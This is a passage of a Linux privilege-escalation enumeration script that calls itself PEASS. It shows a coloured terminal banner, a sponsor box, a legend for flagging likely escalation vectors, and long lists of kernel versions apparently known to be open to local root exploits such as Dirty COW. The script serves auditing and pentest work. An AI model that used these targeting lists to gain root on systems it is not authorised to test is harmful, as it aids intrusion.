m \e[48;2;98;177;78m\e[38;2;99;177;79mM-bM-^VM-^D\e[48;2;99;177;79m\e[38;2;96;172;76mM-bM-^VM-^D\e[48;2;99;175;79m\e[38;2;85;151;68mM-bM-^VM-^D\e[48;2;95;169;76m\e[38;2;72;121;60mM-bM-^VM-^D\e[48;2;109;180;92m\e[38;2;37;57;32mM-bM-^VM-^D\e[48;2;100;159;85m\e[38;2;38;41;36mM-bM-^VM-^D\e[48;2;72;107;62m\e[38;2;74;74;74mM-bM-^VM-^D\e[0m\e[38;2;44;65;38mM-bM-^VM-^@\e[38;2;31;48;27mM-bM-^VM-^@\e[38;2;31;48;26mM-bM-^VM-^@\e[38;2;31;52;25mM-bM-^VM-^@\e[38;2;41;71;34mM-bM-^VM-^@\e[38;2;59;97;50mM-bM-^VM-^@\e[0m
   221	               \e[38;2;95;106;94mM-bM-^VM-^@\e[38;2;81;137;65mM-bM-^VM-^@\e[38;2;91;166;73mM-bM-^VM-^@\e[48;2;95;174;76m\e[38;2;61;73;59mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;33;66;26mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;81;143;65mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;102;182;81mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;97;176;77mM-bM-^VM-^D\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;178;78m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;98;179;78m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;98;179;78m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;99;179;78m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;98;179;78m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;98;178;78m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;98;178;78m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;98;178;78m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;98;179;78m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;97;177;77m\e[38;2;98;177;78mM-bM-^VM-^D\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m\e[38;2;98;176;78mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;99;179;78mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;93;169;74mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;56;106;44mM-bM-^VM-^D\e[48;2;96;174;77m\e[38;2;16;31;13mM-bM-^VM-^D\e[48;2;68;126;54m\e[38;2;58;58;58mM-bM-^VM-^D\e[0m\e[38;2;28;50;23mM-bM-^VM-^@\e[38;2;20;22;20mM-bM-^VM-^@\e[0m
   222	                     \e[38;2;41;52;39mM-bM-^VM-^@\e[38;2;39;76;30mM-bM-^VM-^@\e[38;2;73;136;57mM-bM-^VM-^@\e[48;2;90;162;72m\e[38;2;96;100;95mM-bM-^VM-^D\e[48;2;99;175;79m\e[38;2;60;69;58mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;46;59;43mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;32;51;27mM-bM-^VM-^D\e[48;2;98;178;78m\e[38;2;28;50;23mM-bM-^VM-^D\e[48;2;98;178;78m\e[38;2;28;55;22mM-bM-^VM-^D\e[48;2;98;178;78m\e[38;2;35;64;28mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;41;75;33mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;50;89;41mM-bM-^VM-^D\e[48;2;98;177;77m\e[38;2;54;89;45mM-bM-^VM-^D\e[48;2;98;177;77m\e[38;2;53;89;44mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;49;86;39mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;45;83;36mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;40;74;32mM-bM-^VM-^D\e[48;2;98;177;78m\e[38;2;35;64;28mM-bM-^VM-^D\e[48;2;98;178;78m\e[38;2;39;60;33mM-bM-^VM-^D\e[48;2;90;163;71m\e[38;2;55;61;53mM-bM-^VM-^D\e[0m\e[38;2;53;97;41mM-bM-^VM-^@\e[38;2;24;44;19mM-bM-^VM-^@\e[38;2;36;41;35mM-bM-^VM-^@\e[0m
   223	'";
   224	    else
   225	  echo "            \e[48;5;108m     \e[48;5;59m \e[48;5;71m \e[48;5;77m       \e[48;5;22m \e[48;5;108m   \e[48;5;114m \e[48;5;59m \e[49m
   226	            \e[48;5;108m  \e[48;5;71m \e[48;5;22m \e[48;5;113m \e[48;5;71m \e[48;5;94m \e[48;5;214m  \e[48;5;58m \e[48;5;214m    \e[48;5;100m \e[48;5;71m  \e[48;5;16m \e[48;5;108m  \e[49m
   227	            \e[48;5;65m \e[48;5;16m \e[48;5;22m \e[48;5;214m      \e[48;5;16m \e[48;5;214m        \e[48;5;65m  \e[49m
   228	            \e[48;5;65m \e[48;5;214m       \e[48;5;16m \e[48;5;214m \e[48;5;16m \e[48;5;214m       \e[48;5;136m \e[48;5;65m \e[49m
   229	            \e[48;5;23m \e[48;5;214m          \e[48;5;178m \e[48;5;214m       \e[48;5;65m \e[49m
   230	            \e[48;5;16m \e[48;5;214m         \e[48;5;136m \e[48;5;94m   \e[48;5;136m \e[48;5;214m    \e[48;5;65m \e[49m
   231	            \e[48;5;58m \e[48;5;214m  \e[48;5;172m \e[48;5;64m \e[48;5;77m             \e[48;5;71m \e[48;5;65m \e[49m
   232	            \e[48;5;16m \e[48;5;71m \e[48;5;77m  \e[48;5;71m \e[48;5;77m         \e[48;5;71m \e[48;5;77m   \e[48;5;65m  \e[49m
   233	            \e[48;5;59m \e[48;5;71m \e[48;5;77m \e[48;5;77m \e[48;5;16m \e[48;5;77m         \e[48;5;16m \e[48;5;77m   \e[48;5;65m  \e[49m
   234	            \e[48;5;65m  \e[48;5;77m      \e[48;5;71m \e[48;5;16m \e[48;5;77m    \e[48;5;113m \e[48;5;77m   \e[48;5;65m  \e[49m
   235	            \e[48;5;65m \e[48;5;16m \e[48;5;77m  \e[48;5;150m \e[48;5;113m \e[48;5;77m        \e[48;5;150m \e[48;5;113m \e[48;5;77m \e[48;5;65m \e[48;5;59m \e[48;5;65m \e[49m
   236	            \e[48;5;16m \e[48;5;65m \e[48;5;71m \e[48;5;77m             \e[48;5;71m \e[48;5;22m \e[48;5;65m  \e[49m
   237	            \e[48;5;108m  \e[48;5;107m \e[48;5;59m \e[48;5;77m           \e[48;5;16m \e[48;5;114m \e[48;5;108m   \e[49m"
   238	    fi
   239	  fi
   240	}
   241	
   242	
   243	print_support () {
   244	  printf """
   245	    ${GREEN}/---------------------------------------------------------------------------------\\
   246	    |                             ${BLUE}Do you like PEASS?${GREEN}                                  |
   247	    |---------------------------------------------------------------------------------| 
   248	    |         ${YELLOW}Get the latest version${GREEN}    :     ${RED}https://github.com/sponsors/carlospolop${GREEN} |
   249	    |         ${YELLOW}Follow on Twitter${GREEN}         :     ${RED}@carlospolopm${GREEN}                           |
   250	    |         ${YELLOW}Respect on HTB${GREEN}            :     ${RED}SirBroccoli            ${GREEN}                 |
   251	    |---------------------------------------------------------------------------------|
   252	    |                                 ${BLUE}Thank you! ${GREEN}                                     |
   253	    \---------------------------------------------------------------------------------/
   254	"""
   255	}
   256	
   257	###########################################
   258	#-----------) Starting Output (-----------#
   259	###########################################
   260	
   261	echo ""
   262	if [ ! "$QUIET" ]; then print_banner; print_support; fi
   263	printf ${BLUE}"          $SCRIPTNAME-$VERSION ${YELLOW}by carlospolop\n"$NC;
   264	echo ""
   265	printf ${YELLOW}"ADVISORY: ${BLUE}$ADVISORY\n$NC"
   266	echo ""
   267	printf ${BLUE}"Linux Privesc Checklist: ${YELLOW}https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist\n"$NC
   268	echo " LEGEND:" | sed "s,LEGEND,${C}[1;4m&${C}[0m,"
   269	echo "  RED/YELLOW: 95% a PE vector" | sed "s,RED/YELLOW,${SED_RED_YELLOW},"
   270	echo "  RED: You should take a look to it" | sed "s,RED,${SED_RED},"
   271	echo "  LightCyan: Users with console" | sed "s,LightCyan,${SED_LIGHT_CYAN},"
   272	echo "  Blue: Users without console & mounted devs" | sed "s,Blue,${SED_BLUE},"
   273	echo "  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) " | sed "s,Green,${SED_GREEN},"
   274	echo "  LightMagenta: Your username" | sed "s,LightMagenta,${SED_LIGHT_MAGENTA},"
   275	if [ "$IAMROOT" ]; then
   276	  echo ""
   277	  echo "  YOU ARE ALREADY ROOT!!! (it could take longer to complete execution)" | sed "s,YOU ARE ALREADY ROOT!!!,${SED_RED_YELLOW},"
   278	  sleep 3
   279	fi
   280	echo ""
   281	printf " ${DG}Starting $SCRIPTNAME. Caching Writable Folders...$NC"
   282	echo ""
   283	
   284	###########################################
   285	#---------------) Lists (-----------------#
   286	###########################################
   287	
   288	filename="$SCRIPTNAME.txt$RANDOM"
   289	kernelB=" 4.0.[0-9]+| 4.1.[0-9]+| 4.2.[0-9]+| 4.3.[0-9]+| 4.4.[0-9]+| 4.5.[0-9]+| 4.6.[0-9]+| 4.7.[0-9]+| 4.8.[0-9]+| 4.9.[0-9]+| 4.10.[0-9]+| 4.11.[0-9]+| 4.12.[0-9]+| 4.13.[0-9]+| 3.9.6| 3.9.0| 3.9| 3.8.9| 3.8.8| 3.8.7| 3.8.6| 3.8.5| 3.8.4| 3.8.3| 3.8.2| 3.8.1| 3.8.0| 3.8| 3.7.6| 3.7.0| 3.7| 3.6.0| 3.6| 3.5.0| 3.5| 3.4.9| 3.4.8| 3.4.6| 3.4.5| 3.4.4| 3.4.3| 3.4.2| 3.4.1| 3.4.0| 3.4| 3.3| 3.2| 3.19.0| 3.16.0| 3.15| 3.14| 3.13.1| 3.13.0| 3.13| 3.12.0| 3.12| 3.11.0| 3.11| 3.10.6| 3.10.0| 3.10| 3.1.0| 3.0.6| 3.0.5| 3.0.4| 3.0.3| 3.0.2| 3.0.1| 3.0.0| 2.6.9| 2.6.8| 2.6.7| 2.6.6| 2.6.5| 2.6.4| 2.6.39| 2.6.38| 2.6.37| 2.6.36| 2.6.35| 2.6.34| 2.6.33| 2.6.32| 2.6.31| 2.6.30| 2.6.3| 2.6.29| 2.6.28| 2.6.27| 2.6.26| 2.6.25| 2.6.24.1| 2.6.24| 2.6.23| 2.6.22| 2.6.21| 2.6.20| 2.6.2| 2.6.19| 2.6.18| 2.6.17| 2.6.16| 2.6.15| 2.6.14| 2.6.13| 2.6.12| 2.6.11| 2.6.10| 2.6.1| 2.6.0| 2.4.9| 2.4.8| 2.4.7| 2.4.6| 2.4.5| 2.4.4| 2.4.37| 2.4.36| 2.4.35| 2.4.34| 2.4.33| 2.4.32| 2.4.31| 2.4.30| 2.4.29| 2.4.28| 2.4.27| 2.4.26| 2.4.25| 2.4.24| 2.4.23| 2.4.22| 2.4.21| 2.4.20| 2.4.19| 2.4.18| 2.4.17| 2.4.16| 2.4.15| 2.4.14| 2.4.13| 2.4.12| 2.4.11| 2.4.10| 2.2.24"
   290	kernelDCW_Ubuntu_Precise_1="3.1.1-1400-linaro-lt-mx5|3.11.0-13-generic|3.11.0-14-generic|3.11.0-15-generic|3.11.0-17-generic|3.11.0-18-generic|3.11.0-20-generic|3.11.0-22-generic|3.11.0-23-generic|3.11.0-24-generic|3.11.0-26-generic|3.13.0-100-generic|3.13.0-24-generic|3.13.0-27-generic|3.13.0-29-generic|3.13.0-30-generic|3.13.0-32-generic|3.13.0-33-generic|3.13.0-34-generic|3.13.0-35-generic|3.13.0-36-generic|3.13.0-37-generic|3.13.0-39-generic|3.13.0-40-generic|3.13.0-41-generic|3.13.0-43-generic|3.13.0-44-generic|3.13.0-46-generic|3.13.0-48-generic|3.13.0-49-generic|3.13.0-51-generic|3.13.0-52-generic|3.13.0-53-generic|3.13.0-54-generic|3.13.0-55-generic|3.13.0-57-generic|3.13.0-58-generic|3.13.0-59-generic|3.13.0-61-generic|3.13.0-62-generic|3.13.0-63-generic|3.13.0-65-generic|3.13.0-66-generic|3.13.0-67-generic|3.13.0-68-generic|3.13.0-71-generic|3.13.0-73-generic|3.13.0-74-generic|3.13.0-76-generic|3.13.0-77-generic|3.13.0-79-generic|3.13.0-83-generic|3.13.0-85-generic|3.13.0-86-generic|3.13.0-88-generic|3.13.0-91-generic|3.13.0-92-generic|3.13.0-93-generic|3.13.0-95-generic|3.13.0-96-generic|3.13.0-98-generic|3.2.0-101-generic|3.2.0-101-generic-pae|3.2.0-101-virtual|3.2.0-102-generic|3.2.0-102-generic-pae|3.2.0-102-virtual"
   291	kernelDCW_Ubuntu_Precise_2="3.2.0-104-generic|3.2.0-104-generic-pae|3.2.0-104-virtual|3.2.0-105-generic|3.2.0-105-generic-pae|3.2.0-105-virtual|3.2.0-106-generic|3.2.0-106-generic-pae|3.2.0-106-virtual|3.2.0-107-generic|3.2.0-107-generic-pae|3.2.0-107-virtual|3.2.0-109-generic|3.2.0-109-generic-pae|3.2.0-109-virtual|3.2.0-110-generic|3.2.0-110-generic-pae|3.2.0-110-virtual|3.2.0-111-generic|3.2.0-111-generic-pae|3.2.0-111-virtual|3.2.0-1412-omap4|3.2.0-1602-armadaxp|3.2.0-23-generic|3.2.0-23-generic-pae|3.2.0-23-lowlatency|3.2.0-23-lowlatency-pae|3.2.0-23-omap|3.2.0-23-powerpc-smp|3.2.0-23-powerpc64-smp|3.2.0-23-virtual|3.2.0-24-generic|3.2.0-24-generic-pae|3.2.0-24-virtual|3.2.0-25-generic|3.2.0-25-generic-pae|3.2.0-25-virtual|3.2.0-26-generic|3.2.0-26-generic-pae|3.2.0-26-virtual|3.2.0-27-generic|3.2.0-27-generic-pae|3.2.0-27-virtual|3.2.0-29-generic|3.2.0-29-generic-pae|3.2.0-29-virtual|3.2.0-31-generic|3.2.0-31-generic-pae|3.2.0-31-virtual|3.2.0-32-generic|3.2.0-32-generic-pae|3.2.0-32-virtual|3.2.0-33-generic|3.2.0-33-generic-pae|3.2.0-33-lowlatency|3.2.0-33-lowlatency-pae|3.2.0-33-virtual|3.2.0-34-generic|3.2.0-34-generic-pae|3.2.0-34-virtual|3.2.0-35-generic|3.2.0-35-generic-pae|3.2.0-35-lowlatency|3.2.0-35-lowlatency-pae|3.2.0-35-virtual"
   292	kernelDCW_Ubuntu_Precise_3="3.2.0-36-generic|3.2.0-36-generic-pae|3.2.0-36-lowlatency|3.2.0-36-lowlatency-pae|3.2.0-36-virtual|3.2.0-37-generic|3.2.0-37-generic-pae|3.2.0-37-lowlatency|3.2.0-37-lowlatency-pae|3.2.0-37-virtual|3.2.0-38-generic|3.2.0-38-generic-pae|3.2.0-38-lowlatency|3.2.0-38-lowlatency-pae|3.2.0-38-virtual|3.2.0-39-generic|3.2.0-39-generic-pae|3.2.0-39-lowlatency|3.2.0-39-lowlatency-pae|3.2.0-39-virtual|3.2.0-40-generic|3.2.0-40-generic-pae|3.2.0-40-lowlatency|3.2.0-40-lowlatency-pae|3.2.0-40-virtual|3.2.0-41-generic|3.2.0-41-generic-pae|3.2.0-41-lowlatency|3.2.0-41-lowlatency-pae|3.2.0-41-virtual|3.2.0-43-generic|3.2.0-43-generic-pae|3.2.0-43-virtual|3.2.0-44-generic|3.2.0-44-generic-pae|3.2.0-44-lowlatency|3.2.0-44-lowlatency-pae|3.2.0-44-virtual|3.2.0-45-generic|3.2.0-45-generic-pae|3.2.0-45-virtual|3.2.0-48-generic|3.2.0-48-generic-pae|3.2.0-48-lowlatency|3.2.0-48-lowlatency-pae|3.2.0-48-virtual|3.2.0-51-generic|3.2.0-51-generic-pae|3.2.0-51-lowlatency|3.2.0-51-lowlatency-pae|3.2.0-51-virtual|3.2.0-52-generic|3.2.0-52-generic-pae|3.2.0-52-lowlatency|3.2.0-52-lowlatency-pae|3.2.0-52-virtual|3.2.0-53-generic"
   293	kernelDCW_Ubuntu_Precise_4="3.2.0-53-generic-pae|3.2.0-53-lowlatency|3.2.0-53-lowlatency-pae|3.2.0-53-virtual|3.2.0-54-generic|3.2.0-54-generic-pae|3.2.0-54-lowlatency|3.2.0-54-lowlatency-pae|3.2.0-54-virtual|3.2.0-55-generic|3.2.0-55-generic-pae|3.2.0-55-lowlatency|3.2.0-55-lowlatency-pae|3.2.0-55-virtual|3.2.0-56-generic|3.2.0-56-generic-pae|3.2.0-56-lowlatency|3.2.0-56-lowlatency-pae|3.2.0-56-virtual|3.2.0-57-generic|3.2.0-57-generic-pae|3.2.0-57-lowlatency|3.2.0-57-lowlatency-pae|3.2.0-57-virtual|3.2.0-58-generic|3.2.0-58-generic-pae|3.2.0-58-lowlatency|3.2.0-58-lowlatency-pae|3.2.0-58-virtual|3.2.0-59-generic|3.2.0-59-generic-pae|3.2.0-59-lowlatency|3.2.0-59-lowlatency-pae|3.2.0-59-virtual|3.2.0-60-generic|3.2.0-60-generic-pae|3.2.0-60-lowlatency|3.2.0-60-lowlatency-pae|3.2.0-60-virtual|3.2.0-61-generic|3.2.0-61-generic-pae|3.2.0-61-virtual|3.2.0-63-generic|3.2.0-63-generic-pae|3.2.0-63-lowlatency|3.2.0-63-lowlatency-pae|3.2.0-63-virtual|3.2.0-64-generic|3.2.0-64-generic-pae|3.2.0-64-lowlatency|3.2.0-64-lowlatency-pae|3.2.0-64-virtual|3.2.0-65-generic|3.2.0-65-generic-pae|3.2.0-65-lowlatency|3.2.0-65-lowlatency-pae|3.2.0-65-virtual|3.2.0-67-generic|3.2.0-67-generic-pae|3.2.0-67-lowlatency|3.2.0-67-lowlatency-pae|3.2.0-67-virtual|3.2.0-68-generic"
   294	kernelDCW_Ubuntu_Precise_5="3.2.0-68-generic-pae|3.2.0-68-lowlatency|3.2.0-68-lowlatency-pae|3.2.0-68-virtual|3.2.0-69-generic|3.2.0-69-generic-pae|3.2.0-69-lowlatency|3.2.0-69-lowlatency-pae|3.2.0-69-virtual|3.2.0-70-generic|3.2.0-70-generic-pae|3.2.0-70-lowlatency|3.2.0-70-lowlatency-pae|3.2.0-70-virtual|3.2.0-72-generic|3.2.0-72-generic-pae|3.2.0-72-lowlatency|3.2.0-72-lowlatency-pae|3.2.0-72-virtual|3.2.0-73-generic|3.2.0-73-generic-pae|3.2.0-73-lowlatency|3.2.0-73-lowlatency-pae|3.2.0-73-virtual|3.2.0-74-generic|3.2.0-74-generic-pae|3.2.0-74-lowlatency|3.2.0-74-lowlatency-pae|3.2.0-74-virtual|3.2.0-75-generic|3.2.0-75-generic-pae|3.2.0-75-lowlatency|3.2.0-75-lowlatency-pae|3.2.0-75-virtual|3.2.0-76-generic|3.2.0-76-generic-pae|3.2.0-76-lowlatency|3.2.0-76-lowlatency-pae|3.2.0-76-virtual|3.2.0-77-generic|3.2.0-77-generic-pae|3.2.0-77-lowlatency|3.2.0-77-lowlatency-pae|3.2.0-77-virtual|3.2.0-79-generic|3.2.0-79-generic-pae|3.2.0-79-lowlatency|3.2.0-79-lowlatency-pae|3.2.0-79-virtual|3.2.0-80-generic|3.2.0-80-generic-pae|3.2.0-80-lowlatency|3.2.0-80-lowlatency-pae|3.2.0-80-virtual|3.2.0-82-generic|3.2.0-82-generic-pae|3.2.0-82-lowlatency|3.2.0-82-lowlatency-pae|3.2.0-82-virtual|3.2.0-83-generic|3.2.0-83-generic-pae|3.2.0-83-virtual|3.2.0-84-generic"
   295	kernelDCW_Ubuntu_Precise_6="3.2.0-84-generic-pae|3.2.0-84-virtual|3.2.0-85-generic|3.2.0-85-generic-pae|3.2.0-85-virtual|3.2.0-86-generic|3.2.0-86-generic-pae|3.2.0-86-virtual|3.2.0-87-generic|3.2.0-87-generic-pae|3.2.0-87-virtual|3.2.0-88-generic|3.2.0-88-generic-pae|3.2.0-88-virtual|3.2.0-89-generic|3.2.0-89-generic-pae|3.2.0-89-virtual|3.2.0-90-generic|3.2.0-90-generic-pae|3.2.0-90-virtual|3.2.0-91-generic|3.2.0-91-generic-pae|3.2.0-91-virtual|3.2.0-92-generic|3.2.0-92-generic-pae|3.2.0-92-virtual|3.2.0-93-generic|3.2.0-93-generic-pae|3.2.0-93-virtual|3.2.0-94-generic|3.2.0-94-generic-pae|3.2.0-94-virtual|3.2.0-95-generic|3.2.0-95-generic-pae|3.2.0-95-virtual|3.2.0-96-generic|3.2.0-96-generic-pae|3.2.0-96-virtual|3.2.0-97-generic|3.2.0-97-generic-pae|3.2.0-97-virtual|3.2.0-98-generic|3.2.0-98-generic-pae|3.2.0-98-virtual|3.2.0-99-generic|3.2.0-99-generic-pae|3.2.0-99-virtual|3.5.0-40-generic|3.5.0-41-generic|3.5.0-42-generic|3.5.0-43-generic|3.5.0-44-generic|3.5.0-45-generic|3.5.0-46-generic|3.5.0-49-generic|3.5.0-51-generic|3.5.0-52-generic|3.5.0-54-generic|3.8.0-19-generic|3.8.0-21-generic|3.8.0-22-generic|3.8.0-23-generic|3.8.0-27-generic|3.8.0-29-generic|3.8.0-30-generic|3.8.0-31-generic|3.8.0-32-generic|3.8.0-33-generic|3.8.0-34-generic|3.8.0-35-generic|3.8.0-36-generic|3.8.0-37-generic|3.8.0-38-generic|3.8.0-39-generic|3.8.0-41-generic|3.8.0-42-generic"
   296	kernelDCW_Ubuntu_Trusty_1="3.13.0-24-generic|3.13.0-24-generic-lpae|3.13.0-24-lowlatency|3.13.0-24-powerpc-e500|3.13.0-24-powerpc-e500mc|3.13.0-24-powerpc-smp|3.13.0-24-powerpc64-emb|3.13.0-24-powerpc64-smp|3.13.0-27-generic|3.13.0-27-lowlatency|3.13.0-29-generic|3.13.0-29-lowlatency|3.13.0-3-exynos5|3.13.0-30-generic|3.13.0-30-lowlatency|3.13.0-32-generic|3.13.0-32-lowlatency|3.13.0-33-generic|3.13.0-33-lowlatency|3.13.0-34-generic|3.13.0-34-lowlatency|3.13.0-35-generic|3.13.0-35-lowlatency|3.13.0-36-generic|3.13.0-36-lowlatency|3.13.0-37-generic|3.13.0-37-lowlatency|3.13.0-39-generic|3.13.0-39-lowlatency|3.13.0-40-generic|3.13.0-40-lowlatency|3.13.0-41-generic|3.13.0-41-lowlatency|3.13.0-43-generic|3.13.0-43-lowlatency|3.13.0-44-generic|3.13.0-44-lowlatency|3.13.0-46-generic|3.13.0-46-lowlatency|3.13.0-48-generic|3.13.0-48-lowlatency|3.13.0-49-generic|3.13.0-49-lowlatency|3.13.0-51-generic|3.13.0-51-lowlatency|3.13.0-52-generic|3.13.0-52-lowlatency|3.13.0-53-generic|3.13.0-53-lowlatency|3.13.0-54-generic|3.13.0-54-lowlatency|3.13.0-55-generic|3.13.0-55-lowlatency|3.13.0-57-generic|3.13.0-57-lowlatency|3.13.0-58-generic|3.13.0-58-lowlatency|3.13.0-59-generic|3.13.0-59-lowlatency|3.13.0-61-generic|3.13.0-61-lowlatency|3.13.0-62-generic|3.13.0-62-lowlatency|3.13.0-63-generic|3.13.0-63-lowlatency|3.13.0-65-generic|3.13.0-65-lowlatency|3.13.0-66-generic|3.13.0-66-lowlatency"
   297	kernelDCW_Ubuntu_Trusty_2="3.13.0-67-generic|3.13.0-67-lowlatency|3.13.0-68-generic|3.13.0-68-lowlatency|3.13.0-70-generic|3.13.0-70-lowlatency|3.13.0-71-generic|3.13.0-71-lowlatency|3.13.0-73-generic|3.13.0-73-lowlatency|3.13.0-74-generic|3.13.0-74-lowlatency|3.13.0-76-generic|3.13.0-76-lowlatency|3.13.0-77-generic|3.13.0-77-lowlatency|3.13.0-79-generic|3.13.0-79-lowlatency|3.13.0-83-generic|3.13.0-83-lowlatency|3.13.0-85-generic|3.13.0-85-lowlatency|3.13.0-86-generic|3.13.0-86-lowlatency|3.13.0-87-generic|3.13.0-87-lowlatency|3.13.0-88-generic|3.13.0-88-lowlatency|3.13.0-91-generic|3.13.0-91-lowlatency|3.13.0-92-generic|3.13.0-92-lowlatency|3.13.0-93-generic|3.13.0-93-lowlatency|3.13.0-95-generic|3.13.0-95-lowlatency|3.13.0-96-generic|3.13.0-96-lowlatency|3.13.0-98-generic|3.13.0-98-lowlatency|3.16.0-25-generic|3.16.0-25-lowlatency|3.16.0-26-generic|3.16.0-26-lowlatency|3.16.0-28-generic|3.16.0-28-lowlatency|3.16.0-29-generic|3.16.0-29-lowlatency|3.16.0-31-generic|3.16.0-31-lowlatency|3.16.0-33-generic|3.16.0-33-lowlatency|3.16.0-34-generic|3.16.0-34-lowlatency|3.16.0-36-generic|3.16.0-36-lowlatency|3.16.0-37-generic|3.16.0-37-lowlatency|3.16.0-38-generic|3.16.0-38-lowlatency|3.16.0-39-generic|3.16.0-39-lowlatency|3.16.0-41-generic|3.16.0-41-lowlatency|3.16.0-43-generic|3.16.0-43-lowlatency|3.16.0-44-generic|3.16.0-44-lowlatency|3.16.0-45-generic"
   298	kernelDCW_Ubuntu_Trusty_3="3.16.0-45-lowlatency|3.16.0-46-generic|3.16.0-46-lowlatency|3.16.0-48-generic|3.16.0-48-lowlatency|3.16.0-49-generic|3.16.0-49-lowlatency|3.16.0-50-generic|3.16.0-50-lowlatency|3.16.0-51-generic|3.16.0-51-lowlatency|3.16.0-52-generic|3.16.0-52-lowlatency|3.16.0-53-generic|3.16.0-53-lowlatency|3.16.0-55-generic|3.16.0-55-lowlatency|3.16.0-56-generic|3.16.0-56-lowlatency|3.16.0-57-generic|3.16.0-57-lowlatency|3.16.0-59-generic|3.16.0-59-lowlatency|3.16.0-60-generic|3.16.0-60-lowlatency|3.16.0-62-generic|3.16.0-62-lowlatency|3.16.0-67-generic|3.16.0-67-lowlatency|3.16.0-69-generic|3.16.0-69-lowlatency|3.16.0-70-generic|3.16.0-70-lowlatency|3.16.0-71-generic|3.16.0-71-lowlatency|3.16.0-73-generic|3.16.0-73-lowlatency|3.16.0-76-generic|3.16.0-76-lowlatency|3.16.0-77-generic|3.16.0-77-lowlatency|3.19.0-20-generic|3.19.0-20-lowlatency|3.19.0-21-generic|3.19.0-21-lowlatency|3.19.0-22-generic|3.19.0-22-lowlatency|3.19.0-23-generic|3.19.0-23-lowlatency|3.19.0-25-generic|3.19.0-25-lowlatency|3.19.0-26-generic|3.19.0-26-lowlatency|3.19.0-28-generic|3.19.0-28-lowlatency|3.19.0-30-generic|3.19.0-30-lowlatency|3.19.0-31-generic|3.19.0-31-lowlatency|3.19.0-32-generic|3.19.0-32-lowlatency|3.19.0-33-generic|3.19.0-33-lowlatency|3.19.0-37-generic|3.19.0-37-lowlatency|3.19.0-39-generic|3.19.0-39-lowlatency|3.19.0-41-generic|3.19.0-41-lowlatency|3.19.0-42-generic"
   299	kernelDCW_Ubuntu_Trusty_4="3.19.0-42-lowlatency|3.19.0-43-generic|3.19.0-43-lowlatency|3.19.0-47-generic|3.19.0-47-lowlatency|3.19.0-49-generic|3.19.0-49-lowlatency|3.19.0-51-generic|3.19.0-51-lowlatency|3.19.0-56-generic|3.19.0-56-lowlatency|3.19.0-58-generic|3.19.0-58-lowlatency|3.19.0-59-generic|3.19.0-59-lowlatency|3.19.0-61-generic|3.19.0-61-lowlatency|3.19.0-64-generic|3.19.0-64-lowlatency|3.19.0-65-generic|3.19.0-65-lowlatency|3.19.0-66-generic|3.19.0-66-lowlatency|3.19.0-68-generic|3.19.0-68-lowlatency|3.19.0-69-generic|3.19.0-69-lowlatency|3.19.0-71-generic|3.19.0-71-lowlatency|3.4.0-5-chromebook|4.2.0-18-generic|4.2.0-18-lowlatency|4.2.0-19-generic|4.2.0-19-lowlatency|4.2.0-21-generic|4.2.0-21-lowlatency|4.2.0-22-generic|4.2.0-22-lowlatency|4.2.0-23-generic|4.2.0-23-lowlatency|4.2.0-25-generic|4.2.0-25-lowlatency|4.2.0-27-generic|4.2.0-27-lowlatency|4.2.0-30-generic|4.2.0-30-lowlatency|4.2.0-34-generic|4.2.0-34-lowlatency|4.2.0-35-generic|4.2.0-35-lowlatency|4.2.0-36-generic|4.2.0-36-lowlatency|4.2.0-38-generic|4.2.0-38-lowlatency|4.2.0-41-generic|4.2.0-41-lowlatency|4.4.0-21-generic|4.4.0-21-lowlatency|4.4.0-22-generic|4.4.0-22-lowlatency|4.4.0-24-generic|4.4.0-24-lowlatency|4.4.0-28-generic|4.4.0-28-lowlatency|4.4.0-31-generic|4.4.0-31-lowlatency|4.4.0-34-generic|4.4.0-34-lowlatency|4.4.0-36-generic|4.4.0-36-lowlatency|4.4.0-38-generic|4.4.0-38-lowlatency|4.4.0-42-generic|4.4.0-42-lowlatency"
   300	kernelDCW_Ubuntu_Xenial="4.4.0-1009-raspi2|4.4.0-1012-snapdragon|4.4.0-21-generic|4.4.0-21-generic-lpae|4.4.0-21-lowlatency|4.4.0-21-powerpc-e500mc|4.4.0-21-powerpc-smp|4.4.0-21-powerpc64-emb|4.4.0-21-powerpc64-smp|4.4.0-22-generic|4.4.0-22-lowlatency|4.4.0-24-generic|4.4.0-24-lowlatency|4.4.0-28-generic|4.4.0-28-lowlatency|4.4.0-31-generic|4.4.0-31-lowlatency|4.4.0-34-generic|4.4.0-34-lowlatency|4.4.0-36-generic|4.4.0-36-lowlatency|4.4.0-38-generic|4.4.0-38-lowlatency|4.4.0-42-generic|4.4.0-42-lowlatency"
